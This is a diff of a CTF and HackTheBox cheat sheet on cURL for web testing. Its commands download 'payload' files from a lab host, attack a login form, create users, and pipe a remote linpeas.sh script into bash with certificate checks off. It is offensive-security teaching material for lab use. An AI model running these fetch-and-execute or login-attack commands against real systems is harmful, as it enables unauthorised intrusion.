@@ -8,48 +8,48 @@ Although attack proxies like BurpSuitePro are very handy tools, cURL allows you 
 
 ## cURL GET parameters
 HTTP GET variables can be set by adding them to the URL.
-```
+```Bash
 curl http://10.10.10.10/index.php?sessionid=vn0g4d94rs09rgpqga85r9bnia
 ```
 
 ## cURL POST parameters
 HTTP POST variables can be set using the -d (--data) parameter.  
 Here is a simple login test example:  
-```
+```Bash
 curl --data "email=test@test.com&password=test" http://10.10.10.10/login.php
 ```
 ## cURL COOKIEs
 cURL has an entire cookie engine that can be used to store and load cookies passed to it from a server between sessions:
-```
+```Bash
 curl -b oldcookies.txt -c newcookies.txt http://10.10.10.10/login.php
 ```
 You can also specify your own cookies using the -b parameter:
-```
+```Bash
 curl -b "PHPSESSID=vn0g4d94rs09rgpqga85r9bnia" http://10.10.10.10/home.php
 ```
 
 ## cURL User Agents
-```
+```Bash
 curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" http://10.10.10.10/login.php
 ```
 
 ## cURL Save the server response to a file
-```
+```Bash
 curl -o payload.sh http://10.10.10.10/payload.sh
 ```
 
 ## cURL download a file to the current folder
-```
+```Bash
 curl -O http://10.10.10.10/payload.zip
 ```
 
 ## cURL follow HTTP/1.1 302 Found redirects
-```
+```Bash
 curl -L http://10.10.10.10/profile.php
 ```
 
 ## cURL view verbose debugging information
-```
+```Bash
 curl -v http://10.10.10.10/profile.php
 ```
 
@@ -57,17 +57,17 @@ curl -v http://10.10.10.10/profile.php
 Now that we have covered the basic syntax and use cases, here are some practical hacking applications that are very helpful on Hackthebox or CTF boxes.
 
 ## Using cURL to pipe a remote scipt (linpeas.sh) directly to bash:
-```
+```Bash
 curl -sSk "http://10.10.10.10/linpeas.sh" | bash
 ```
 
 ## Attacking a Login Form with cURL
-```
+```Bash
 curl --data "email=test@test.com&password=test" http://10.10.10.10/login.php
 ```
 
 ## Creating new users with cURL
-```
+```Bash
 curl --data "name=test&email=test@test.com&password=test" http://10.10.10.10/newuser.php
 ```
 
